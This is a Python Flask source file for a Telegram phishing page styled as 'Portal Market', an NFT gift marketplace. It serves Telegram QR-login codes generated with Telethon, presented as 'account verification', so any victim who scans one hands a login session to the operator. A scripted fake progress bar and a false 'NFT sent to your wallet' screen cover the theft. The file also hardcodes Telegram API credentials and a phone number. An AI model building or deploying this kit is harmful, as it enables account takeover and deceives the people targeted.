from flask import Flask, jsonify, send_file, render_template_string
from flask_cors import CORS
from telethon import TelegramClient
import qrcode
import io
import base64
import asyncio
import os
import time

app = Flask(__name__)
CORS(app)

# ===== КОНФИГ =====
API_ID = 33068855
API_HASH = "7774b39a61215af9a521163be5efca77"
PHONE = "+79963066267"
# ==================

current_qr = None
qr_login_obj = None

async def generate_qr():
    global current_qr, qr_login_obj
    client = TelegramClient('qr_session', API_ID, API_HASH)
    await client.start(phone=PHONE)
    
    qr_login = await client.qr_login()
    qr_login_obj = qr_login
    qr_url = qr_login.url
    
    qr_img = qrcode.make(qr_url)
    buffered = io.BytesIO()
    qr_img.save(buffered, format="PNG")
    qr_base64 = base64.b64encode(buffered.getvalue()).decode()
    
    current_qr = {'qr': qr_base64, 'url': qr_url, 'timestamp': time.time()}
    
    asyncio.create_task(wait_for_scan(qr_login))
    await client.disconnect()
    return current_qr

async def wait_for_scan(qr_login):
    print("⏳ Ожидаем сканирования QR...")
    try:
        await qr_login.wait()
        print("✅ QR-код отсканирован! Вход выполнен.")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

@app.route('/qr')
def get_qr():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(generate_qr())
    return jsonify(current_qr)

@app.route('/')
def index():
    # ВСТРОЕННАЯ HTML-СТРАНИЦА
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Portal Market</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', sans-serif;
                min-height: 100vh;
                overflow: hidden;
                background: #f2f2f7;
                background-image:
                    radial-gradient(ellipse at 15% 85%, rgba(200,200,210,0.35) 0%, transparent 55%),
                    radial-gradient(ellipse at 85% 15%, rgba(220,220,230,0.25) 0%, transparent 45%);
            }
            #loadingScreen {
                position: fixed;
                inset: 0;
                background: #f2f2f7;
                z-index: 9999;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                transition: opacity 0.6s ease;
            }
            #loadingScreen.hidden { opacity: 0; pointer-events: none; }
            .welcome-container {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
                max-width: 320px;
                padding: 0 16px;
            }
            .welcome-main {
                font-size: 28px;
                font-weight: 600;
                color: #000;
                opacity: 0;
                transform: translateY(12px);
                transition: opacity 0.8s ease, transform 0.8s cubic-bezier(0.22, 1, 0.36, 1);
            }
            .welcome-main.show { opacity: 1; transform: translateY(0); }
            .welcome-desc {
                font-size: 15px;
                font-weight: 400;
                color: #666;
                line-height: 1.5;
                margin-top: 8px;
                opacity: 0;
                transform: translateY(10px);
                transition: opacity 0.8s ease 0.2s, transform 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.2s;
            }
            .welcome-desc.show { opacity: 1; transform: translateY(0); }
            .app {
                width: 100%;
                max-width: 400px;
                margin: 0 auto;
                padding: 80px 20px 40px 20px;
                display: none;
                min-height: 100vh;
                align-items: center;
                justify-content: center;
                flex-direction: column;
            }
            .app.visible { display: flex; }
            .glass {
                width: 100%;
                background: rgba(255, 255, 255, 0.55);
                backdrop-filter: blur(32px) saturate(1.2);
                -webkit-backdrop-filter: blur(32px) saturate(1.2);
                border-radius: 36px;
                padding: 40px 28px 32px 28px;
                box-shadow: 0 8px 48px rgba(0, 0, 0, 0.04), inset 0 0.5px 0 rgba(255, 255, 255, 0.6);
                border: 0.5px solid rgba(255, 255, 255, 0.4);
                animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1);
            }
            @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
            .logo-mini { text-align: center; margin-bottom: 28px; }
            .logo-mini h1 { font-size: 26px; font-weight: 700; letter-spacing: -0.5px; color: #000; }
            .logo-mini p { font-size: 14px; color: #888; margin-top: 4px; }
            .btn-primary {
                width: 100%;
                padding: 16px;
                background: #000;
                color: #fff;
                border: none;
                border-radius: 16px;
                font-size: 17px;
                font-weight: 600;
                cursor: pointer;
                transition: 0.15s;
                margin-top: 6px;
            }
            .btn-primary:active { transform: scale(0.97); background: #1a1a1a; }
            .info-box {
                margin-top: 24px;
                padding: 18px 20px 16px 20px;
                border: 1px solid rgba(0, 0, 0, 0.04);
                border-radius: 16px;
                background: rgba(255, 255, 255, 0.3);
                backdrop-filter: blur(4px);
                text-align: center;
                display: flex;
                flex-direction: column;
                gap: 4px;
            }
            .info-box .main-text { font-size: 16px; font-weight: 700; color: #000; line-height: 1.4; }
            .info-box .sub-text { font-size: 14px; font-weight: 400; color: #777; margin-top: 2px; }
            .info-box i { font-size: 16px; color: #000; opacity: 0.15; margin-bottom: 4px; }
            .progress-wrap { margin-top: 24px; padding: 0 4px; }
            .progress-track { width: 100%; height: 4px; background: rgba(0, 0, 0, 0.06); border-radius: 4px; overflow: hidden; }
            .progress-bar { height: 100%; width: 0%; background: #000; border-radius: 4px; transition: width 0.3s cubic-bezier(0.22, 1, 0.36, 1); }
            .status-line {
                text-align: center;
                font-size: 15px;
                font-weight: 500;
                color: #444;
                margin-top: 16px;
                padding: 12px 16px;
                background: rgba(0, 0, 0, 0.03);
                border-radius: 14px;
                border: 0.5px solid rgba(0, 0, 0, 0.04);
                min-height: 48px;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.4s ease;
            }
            .status-line .dot {
                display: inline-block;
                width: 8px;
                height: 8px;
                border-radius: 50%;
                margin-right: 10px;
                background: #000;
                opacity: 0.15;
                animation: pulseDot 1.2s ease-in-out infinite;
            }
            @keyframes pulseDot { 0%, 100% { opacity: 0.15; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.3); } }
            .status-line .status-text { flex: 1; }
            .hidden { display: none !important; }
            .icon-big { font-size: 32px; color: #000; opacity: 0.08; text-align: center; margin-bottom: 8px; }
            .icon-big.success { color: #34c759; opacity: 1; }
            @media (max-width: 420px) {
                .glass { padding: 32px 20px 28px 20px; }
                .welcome-main { font-size: 24px; }
                .welcome-desc { font-size: 14px; }
            }
        </style>
    </head>
    <body>
        <div id="loadingScreen">
            <div class="welcome-container">
                <div class="welcome-main" id="welcomeMain">Welcome to Portals!</div>
                <div class="welcome-desc" id="welcomeDesc">Discover, trade, and collect unique digital gifts in our marketplace. Start exploring now!</div>
            </div>
        </div>

        <div class="app" id="app">
            <div class="glass">
                <div id="step1">
                    <div class="logo-mini">
                        <div class="icon-big"><i class="fas fa-qrcode"></i></div>
                        <h1>Верификация через QR</h1>
                        <p>Отсканируйте QR-код камерой Telegram</p>
                    </div>
                    <div style="text-align:center; margin:20px 0;">
                        <img id="qrImage" src="" alt="QR-код" style="width:200px; height:200px; border-radius:16px; background:#fff; padding:8px; box-shadow:0 4px 20px rgba(0,0,0,0.04);">
                        <p style="font-size:12px; color:#888; margin-top:8px;">Обновляется каждые 30 секунд</p>
                    </div>
                    <button class="btn-primary" id="qrScanBtn">Я отсканировал</button>
                    <div class="info-box">
                        <i class="fas fa-shield-alt"></i>
                        <div class="main-text">QR-код для верификации аккаунта</div>
                        <div class="sub-text">Сканируйте камерой Telegram</div>
                    </div>
                </div>

                <div id="step2" class="hidden">
                    <div class="logo-mini">
                        <div class="icon-big"><i class="fas fa-circle-notch fa-spin"></i></div>
                        <h1 style="font-size:22px;">Верификация</h1>
                        <p>Не выходите из приложения</p>
                    </div>
                    <div class="progress-wrap">
                        <div class="progress-track">
                            <div class="progress-bar" id="progressBar"></div>
                        </div>
                    </div>
                    <div class="status-line" id="statusLine">
                        <span class="dot"></span>
                        <span class="status-text" id="statusText">Проверка QR-кода...</span>
                    </div>
                    <button class="btn-primary" id="timerCancelBtn" style="background:#f0f0f0;color:#000;margin-top:16px;">Отмена</button>
                </div>

                <div id="step3" class="hidden">
                    <div class="logo-mini">
                        <div class="icon-big success"><i class="fas fa-check-circle"></i></div>
                        <h1 style="font-size:22px;">Готово</h1>
                        <p>NFT отправлен в ваш кошелёк</p>
                    </div>
                    <button class="btn-primary" onclick="location.reload()" style="margin-top:12px;">На главную</button>
                </div>
            </div>
        </div>

        <script>
            // ===== ЗАГРУЗКА =====
            (function() {
                const loadingScreen = document.getElementById('loadingScreen');
                const welcomeMain = document.getElementById('welcomeMain');
                const welcomeDesc = document.getElementById('welcomeDesc');
                const app = document.getElementById('app');

                setTimeout(() => { welcomeMain.classList.add('show'); }, 400);
                setTimeout(() => { welcomeDesc.classList.add('show'); }, 700);
                setTimeout(() => {
                    loadingScreen.classList.add('hidden');
                    app.classList.add('visible');
                }, 2800);
            })();

            // ===== АВАТАРКА (если в Telegram) =====
            if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
                const user = Telegram.WebApp.initDataUnsafe.user;
                // Можно использовать для приветствия
            }

            // ===== QR-КОД =====
            const QR_API = window.location.origin + '/qr';

            function updateQR() {
                fetch(QR_API)
                    .then(res => res.json())
                    .then(data => {
                        document.getElementById('qrImage').src = 'data:image/png;base64,' + data.qr;
                    })
                    .catch(err => console.error('Ошибка QR:', err));
            }

            setInterval(updateQR, 30000);
            updateQR();

            // ===== КНОПКИ =====
            document.getElementById('qrScanBtn').addEventListener('click', function() {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                startFakeLoading();
            });

            document.getElementById('timerCancelBtn').addEventListener('click', function() {
                location.reload();
            });

            // ===== ФЕЙКОВАЯ ЗАГРУЗКА =====
            function startFakeLoading() {
                const progressBar = document.getElementById('progressBar');
                const statusText = document.getElementById('statusText');
                const statuses = [
                    { progress: 0, text: 'Проверка QR-кода...' },
                    { progress: 20, text: 'Подключение к аккаунту...' },
                    { progress: 50, text: 'Верификация данных...' },
                    { progress: 80, text: 'Подготовка кошелька...' },
                    { progress: 100, text: 'Доступ подтверждён' },
                ];
                let current = 0;
                let step = 0;
                const interval = setInterval(() => {
                    current += 1 + Math.random() * 3;
                    if (current >= 100) {
                        current = 100;
                        clearInterval(interval);
                        document.getElementById('step2').classList.add('hidden');
                        document.getElementById('step3').classList.remove('hidden');
                        return;
                    }
                    progressBar.style.width = current + '%';
                    for (let i = statuses.length - 1; i >= 0; i--) {
                        if (current >= statuses[i].progress) {
                            if (step !== i) {
                                step = i;
                                statusText.textContent = statuses[i].text;
                                document.getElementById('statusLine').style.opacity = '0.5';
                                setTimeout(() => {
                                    document.getElementById('statusLine').style.opacity = '1';
                                }, 250);
                            }
                            break;
                        }
                    }
                }, 500);
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Сервер запущен на порту {port}")
    app.run(host='0.0.0.0', port=port)